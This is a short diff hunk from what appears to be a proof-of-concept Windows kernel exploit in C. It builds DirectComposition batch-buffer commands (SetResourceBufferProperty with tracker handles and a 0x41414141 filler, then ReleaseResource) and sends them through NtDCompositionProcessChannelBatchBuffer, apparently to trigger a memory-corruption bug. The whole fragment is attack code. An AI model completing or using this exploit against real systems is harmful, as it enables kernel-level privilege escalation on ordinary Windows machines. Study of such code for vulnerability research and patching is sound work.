@@ -614,6 +614,16 @@ int main(int argc, TCHAR* argv[]) {
     CopyMemory((PUCHAR)pMappedAddress + 0x10, szBuff, 0xc);
     ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10 + 0xc, &dwArg1, &dwArg2);
 
+    szBuff[0] = Tracker1;
+    szBuff[1] = Tracker2;
+    szBuff[2] = 0x41414141;
+
+    *(DWORD*)pMappedAddress = nCmdSetResourceBufferProperty;
+    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)TrackerBinding1;
+    *(DWORD*)((PUCHAR)pMappedAddress + 8) = 0;
+    *(DWORD*)((PUCHAR)pMappedAddress + 0xc) = 0xc;
+    CopyMemory((PUCHAR)pMappedAddress + 0x10, szBuff, 0xc);
+    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10 + 0xc, &dwArg1, &dwArg2);
 
     *(DWORD*)pMappedAddress = nCmdReleaseResource;
     *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)Tracker1;
